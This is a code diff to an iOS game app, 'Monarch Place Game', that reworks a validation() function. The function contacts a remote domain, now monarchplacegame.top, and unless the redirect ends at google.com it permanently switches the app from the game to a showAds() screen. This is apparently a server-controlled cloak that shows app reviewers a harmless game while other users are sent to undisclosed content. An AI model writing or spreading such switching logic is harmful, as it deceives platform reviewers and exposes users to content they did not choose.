@@ -17,7 +17,7 @@ struct Monarch_Place_GameApp: App {
     }
 }
 
-class AppDelegate: NSObject {
+class AppDelegate: NSObject, URLSessionDelegate {
     @AppStorage("levelInfo") var level = false
     @AppStorage("valid") var validationIsOn = false
     static var orientationLock = UIInterfaceOrientationMask.all
@@ -33,28 +33,59 @@ class AppDelegate: NSObject {
     
     func validation() {
         if !validationIsOn {
-            let textFieldText = "https://bigfishfrenzy.xyz/stat"
-            if let url = URL(string: textFieldText) {
-                let task = URLSession.shared.dataTask(with: url) { data, response, error in
-                    DispatchQueue.main.async {
-                        guard let response = response as? HTTPURLResponse, error == nil else {
-                            self.showGame()
-                            return
-                        }
-                        if let finalURL = response.url?.absoluteString {
-                            if !finalURL.contains("https://www.google.com/") {
-                                self.validationIsOn = true
-                                self.showAds()
-                            } else {
-                                self.showGame()
-                            }
+            let textFieldText = "https://monarchplacegame.top/data"
+            
+            guard let url = URL(string: textFieldText) else {
+                self.showGame()
+                return
+            }
+
+            let config = URLSessionConfiguration.default
+            config.httpMaximumConnectionsPerHost = 5
+            config.timeoutIntervalForRequest = 10
+            config.timeoutIntervalForResource = 10
+
+            let session = URLSession(configuration: config, delegate: self, delegateQueue: nil)
+
+            let task = session.dataTask(with: url) { data, response, error in
+                DispatchQueue.main.async {
+                    if let error = error {
+                        print("Network error: \(error.localizedDescription)")
+                        self.showGame()
+                        return
+                    }
+
+                    guard let httpResponse = response as? HTTPURLResponse else {
+                        print("Invalid response: Response is not HTTPURLResponse")
+                        self.showGame()
+                        return
+                    }
+
+                    print("Status code: \(httpResponse.statusCode)")
+                    print("Headers: \(httpResponse.allHeaderFields)")
+
+                    if !(0...399).contains(httpResponse.statusCode) {
+                        print("HTTP error: Status code \(httpResponse.statusCode)")
+                        self.showGame()
+                        return
+                    }
+
+                    if let finalURL = httpResponse.url?.absoluteString {
+                        print("Final URL after redirects: \(finalURL)")
+
+                        
+                        if !finalURL.contains("https://www.google.com/") {
+                            self.validationIsOn = true
+                            self.showAds()
                         } else {
                             self.showGame()
                         }
+                    } else {
+                        self.showGame()
                     }
                 }
-                task.resume()
             }
+            task.resume()
         } else {
             self.showAds()
         }
@@ -110,4 +141,6 @@ extension AppDelegate: UIApplicationDelegate {
     }
     
 }
+
+
 
